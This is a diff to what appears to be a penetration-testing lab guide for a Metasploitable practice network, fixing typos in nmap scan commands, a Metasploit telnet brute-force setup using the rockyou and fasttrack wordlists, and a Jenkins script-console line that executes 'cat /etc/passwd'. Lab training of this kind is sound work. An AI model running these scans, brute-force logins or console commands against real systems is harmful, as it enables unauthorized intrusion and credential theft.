@@ -36,9 +36,13 @@ TCP scan against 10.1.1.4-254
 
 UDP scan of top ten ports against 10.1.1.4-254
 
-    nmap -sU --top-ports 10.1.1.4-254
+    nmap -sU --top-ports 10 10.1.1.4-254
 
-Aggressive scan against 10.1.14-254 and save to an XML file.
+Use the --open switch to show only the open ports.
+
+    nmap --top-ports 10 --open 10.1.1.4-254
+
+Aggressive scan against 10.1.1.4-254 and save to an XML file.
 
     nmap -A -oX local_network.xml 10.1.1.4-254
 
@@ -56,14 +60,14 @@ Look at the wordlists in the wordlists folder
 
     cd /usr/share/wordlists
     ls
-    sudo gunzip rockyou.txt.gz
+    gunzip rockyou.txt.gz
 
 Brute-force the Telnet service on Metasploitable
 
     use auxiliary/scanner/telnet/telnet_login
     show options
     set USERNAME msfadmin
-    set PASS_FILE /usr/share wordlists/fasttrack.txt
+    set PASS_FILE /usr/share/wordlists/fasttrack.txt
     set USER_AS_PASS true
     set BLANK_PASSWORDS true
     services -p 23 -R
@@ -89,7 +93,7 @@ Find the Jenkins interface
 Once we find Jenkins go to the admin interface and look for the script console.
 
     proc = [‘cat’, ‘/etc/passwd’].execute()
-    println proc.in.txt
+    println proc.in.text
 
 Metasploit also has a module for this.
 
